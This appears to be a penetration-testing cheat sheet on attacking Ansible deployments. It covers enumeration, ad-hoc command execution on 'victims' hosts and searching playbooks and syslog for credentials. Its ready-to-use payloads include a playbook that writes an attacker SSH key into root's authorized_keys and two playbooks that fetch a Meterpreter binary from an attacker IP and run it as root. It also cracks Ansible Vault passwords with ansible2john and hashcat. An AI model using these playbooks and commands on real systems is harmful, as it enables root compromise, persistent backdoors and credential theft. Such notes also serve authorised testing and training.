# Ansible

### Enumerating Ansible

* Is Ansible in use? (Server)

```
ansible

ls /etc/ansible

grep ansible /etc/passwd
```

* Identify Ansible nodes (Client)

```
grep ansible /etc/passwd
```

### Attack Vectors

* Initiated from server
* ad-hoc commands
* playbooks
* Running ansible commands

```
su ansibleadm

ansible victims -a "whoami" 
```

* running as root the name victims comes from the /etc/ansible/hosts file so adjust as needed

```
ansible victims -a "whoami" --become
ansible appservers -a "whoami"
```

## Ansible Playbooks&#x20;

* Running playbooks

```
ansible-playbook [playbookname.yml]
```

## Exploiting Playbooks

### root

* run playbooks as the ansible user

### not root

* search for hardcoded creds in playbooks
  * ansible\_become\_pass
  * /var/log/syslog | grep for pass

## Adding tasks if writable

```
- name: Get system info
	hosts: all
	gather_facts: true
	become: yes
	tasks:
		- name: Display info
		  debug:
			msg: "The hostname is {{ ansible_hostname }} and the OS is {{ansible_distribution }}"

		- name: Create a directory if it does not exist
			file:
				path: /root/.ssh
				state: directory
				mode: '0700'
				owner: root
				group: root
				
		- name: Create authorized keys if it does not exist
			file:
				path: /root/.ssh/authorized_keys
				state: touch
				mode: '0600'
				owner: root
				group: root
				
		- name: Update keys
			lineinfile:
				path: /root/.ssh/authorized_keys
				line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
				insertbefore: EOF
				
				
```

* Reverse Meterpreter

```
- name: Meterpreter reverse tcp
  hosts: linuxvictim
  gather_facts: true
  become: yes
  become_user: root
  tasks:
  - name: Run command
    shell: "mkdir /tmp/shell"
    async: 10
    poll: 0
  - name: Run command
    shell: "wget http://192.168.X.Y/final.out -P /tmp/shell/"
    async: 10
    poll: 0
  - name: Run command
    shell: "chmod +x /tmp/shell/final.out "
    async: 10
    poll: 0
  - name: Run command
    shell: "/tmp/shell/final.out &"
    async: 10
```

* or

```
- name: Meterpreter reverse tcp
  hosts: linuxvictim
  gather_facts: true
  become: yes
  become_user: root
  tasks:
  - name: Run command
    shell: "mkdir /tmp/shell && wget http://192.168.X.Y/final.out -P /tmp/shell/ && chmod +x /tmp/shell/final.out && /tmp/shell/final.out &"   
    async: 10
    poll: 0
```



## Ansible Vault&#x20;

* Copy encrypted password

![](<../../.gitbook/assets/image (172) (1).png>)

* use ansible2john.py
* returns string for hashcat to use

```
python3 /usr/share/john/ansible2john.py ./test.yml > ans2johnhash.txt
```

* copy string into testhash.txt
* then run hashcat

```
hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
```

* copy original vault string to text file and use ansible-vault decrypt with the discovered password

```
cat pw.txt | ansible-vault decrypt
```

### Ansible Data Leakage

* leak to /var/log/syslog
* Cleartext in playbooks
* unless nolog is set in the playbook
